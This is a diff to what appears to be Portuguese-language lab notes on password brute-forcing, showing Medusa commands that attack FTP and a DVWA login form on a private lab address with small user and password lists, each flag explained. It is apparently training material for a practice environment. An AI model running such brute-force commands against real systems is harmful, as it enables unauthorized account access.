@@ -22,3 +22,11 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 //Comando para usar força bruta por meio da Medusa
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 // -h mostra o alvo, -U mostra onde ta a lista de usuarios, -P mostra a lista de senhas, -M mostra que vamos atacar o ftp e -t mostra quantas threads vamos usar
+
+//comando para usar o Medusa no formulário
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+// -m PAGE informa o caminho do formulário de login do servidor, -m FORM é o corpo da requisição, logo o Medusa vai substituir o USER e o PASS por cada linha do arquivo
+e o -m FAIL mostra a mensagem esperada caso o login seja malsucedido.
